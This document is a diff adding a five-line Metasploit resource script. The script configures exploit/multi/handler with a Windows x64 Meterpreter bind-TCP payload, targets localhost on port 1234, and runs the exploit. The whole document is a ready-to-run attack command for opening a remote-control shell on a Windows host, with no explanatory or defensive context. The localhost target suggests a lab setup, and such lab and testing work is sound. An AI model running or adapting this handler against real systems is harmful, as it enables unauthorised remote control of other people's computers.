@@ -1,0 +1,5 @@
+use exploit/multi/handler 
+set payload windows/x64/meterpreter_bind_tcp 
+set rhost localhost
+set lport 1234
+exploit
